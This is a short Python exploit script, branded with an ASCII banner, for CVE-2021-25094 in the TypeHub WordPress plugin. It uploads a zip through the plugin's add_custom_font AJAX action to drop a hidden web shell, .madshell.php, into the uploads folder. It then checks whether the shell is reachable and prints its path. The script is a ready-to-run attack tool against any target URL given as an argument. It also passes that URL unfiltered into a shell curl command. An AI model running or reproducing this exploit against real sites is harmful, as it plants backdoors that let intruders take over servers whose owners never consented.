from sys import argv
from os import system, name
import requests as req
from termcolor import colored

if name == "nt":
    system("cls")
else:
    system("clear")

print("""
 _____                 _   _ _   _ ____
|_   _|   _ _ __   ___| | | | | | | __ )
  | || | | | '_ \ / _ \ |_| | | | |  _\\
  | || |_| | |_) |  __/  _  | |_| | |_) |
  |_| \__, | .__/ \___|_| |_|\___/|____/
      |___/|_|
  Exploiter CVE 2021-25094 By MrMad
""")

try:
    if argv[1]:
        URL = argv[1]
        system('curl {}/wp-admin/admin-ajax.php -F "action=add_custom_font" -F "file=@madexploit.zip"'.format(URL))
        print('\n')
        path = "wp-content/uploads/typehub/custom/madexploit/.madshell.php"
        r = req.get('{}/{}'.format(URL, path))
        if r.status_code == 404:
            print(colored("Not Vulnerable", "red"))
        elif r.status_code == 200:
            print(colored("GOT RESPONSE : {}".format(r.status_code), "yellow"))
            print(colored('PATH :', "yellow"),
                  '{}/wp-content/uploads/typehub/custom/madexploit/.madshell.php'.format(URL))
except:
    print("""[ Usage ] python typhub.py example.com""")
